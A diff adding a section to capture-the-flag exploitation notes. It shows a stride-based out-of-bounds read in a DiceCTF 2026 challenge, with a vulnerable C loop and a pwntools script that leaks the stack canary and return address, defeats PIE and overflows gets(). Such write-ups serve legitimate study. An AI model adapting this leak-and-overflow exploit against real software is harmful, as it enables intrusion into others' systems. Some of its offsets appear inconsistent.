@@ -183,6 +183,62 @@ modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry
 
 **Pattern (MyGit, PascalCTF 2026):** Overflow `valid` flag (offset 32) without touching canary (offset 40). Use `./` as no-op path padding for precise length control. See [advanced.md](advanced.md) for full exploit chain.
 
+## OOB Read via Stride/Rate Leak (DiceCTF 2026)
+
+**Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).
+
+**Stack layout:**
+```
+input_buf  [0-31]    <- user input (null at byte 31)
+crushed    [32-63]   <- output buffer
+canary     [72-79]   <- stack canary
+saved rbp  [80-87]
+return addr [88-95]  <- code pointer (defeats PIE)
+```
+
+**Vulnerable pattern:**
+```c
+void crush_string(char *input, char *output, int rate, int output_max_len) {
+    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
+        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
+    }
+}
+```
+
+**Exploitation:**
+```python
+from pwn import *
+
+# Leak canary bytes 1-7 (byte 0 always 0x00)
+canary = b'\x00'
+for offset in range(73, 80):  # canary at offsets 72-79
+    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
+    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
+    p.sendline(b'2')           # output length = 2
+    resp = p.recvline()
+    canary += resp[1:2]        # second char is leaked byte
+
+# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
+ret_addr = b''
+for offset in range(88, 94):
+    p.sendline(b'A' * 31)
+    p.sendline(str(offset).encode())
+    p.sendline(b'2')
+    resp = p.recvline()
+    ret_addr += resp[1:2]
+
+pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
+admin_portal = pie_base + admin_offset
+
+# Overflow gets() with leaked canary + computed address
+payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
+p.sendline(payload)
+```
+
+**When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.
+
+**Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.
+
 ## Global Buffer Overflow (CSV Injection)
 
 **Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.
